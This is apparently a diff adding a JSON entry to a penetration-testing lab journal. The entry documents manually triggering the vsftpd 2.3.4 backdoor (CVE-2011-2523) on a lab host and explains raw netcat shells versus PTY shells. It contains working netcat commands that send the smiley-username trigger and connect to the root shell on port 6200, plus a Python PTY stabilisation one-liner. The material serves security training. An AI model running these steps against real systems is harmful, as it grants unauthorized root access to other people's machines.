@@ -1,0 +1,35 @@
+{
+  "n": 22,
+  "date": "2026-10-03",
+  "module": "Exploitation & Initial Access",
+  "title": "Supply Chain Backdoor: vsftpd 2.3.4 (CVE-2011-2523) & Raw Socket Shells",
+  "tags": ["vsftpd", "backdoor", "cve-2011-2523", "netcat", "root", "exploitation", "pty"],
+  "summary": "Demonstrated manual triggering of the infamous vsftpd 2.3.4 supply chain backdoor (CVE-2011-2523) without automated exploit frameworks. Transmitted a username containing the smiley token (:) ) causing the daemon to spawn a root listener on TCP 6200. Analyzed raw netcat shell behavior (absence of PTY prompt) and demonstrated shell stabilization via Python PTY spawning.",
+  "sections": [
+    {
+      "h": "The Smiley Trigger Mechanism (Port 21)",
+      "blocks": [
+        {"t": "p", "text": "In July 2011, the official vsftpd 2.3.4 archive on the master repository was compromised. The attacker inserted a hidden check: if any username contains the characters `:)`, a signal handler triggers `execl(\"/bin/sh\",\"sh\",(char *)0)` on port 6200."},
+        {"t": "code", "label": "kali (terminal 1)", "text": "┌──(general㉿lee)-[~]\n└─$ nc -vn 192.168.0.155 21\n(UNKNOWN) [192.168.0.155] 21 (ftp) open\n220 (vsFTPd 2.3.4)\n\nUSER hacker:)\n331 Please specify the password.\nPASS password"},
+        {"t": "p", "text": "Once `PASS` is sent, the FTP connection freezes by design as the daemon forks the background listener."}
+      ]
+    },
+    {
+      "h": "Connecting to the Backdoor (Port 6200)",
+      "blocks": [
+        {"t": "p", "text": "In a second terminal, netcat successfully connected to the spawned backdoor socket:"},
+        {"t": "code", "label": "kali (terminal 2)", "text": "┌──(general㉿lee)-[~]\n└─$ nc -vn 192.168.0.155 6200\n(UNKNOWN) [192.168.0.155] 6200 (?) open"},
+        {"t": "p", "text": "Notice that unlike SSH or a local terminal, no `root@target:~#` prompt appears. This is a **raw non-interactive `/bin/sh` stream**."}
+      ]
+    },
+    {
+      "h": "Understanding Raw Shells vs Interactive PTYs",
+      "blocks": [
+        {"t": "table", "head": ["Shell Type", "Prompt Display", "Behavior & Control"], "rows": [
+          ["**Raw Socket Shell** (`nc`)", "Blank cursor (No PS1)", "Standard Input (stdin) and Standard Output (stdout) are connected directly to the TCP stream. Commands execute upon pressing Enter, but there is no terminal formatting."],
+          ["**Interactive PTY**", "`root@metasploitable:/#`", "A pseudo-terminal allocated via `python -c 'import pty; pty.spawn(\"/bin/bash\")'`. Provides command history, arrow navigation, and shell prompts."]
+        ]}
+      ]
+    }
+  ]
+}
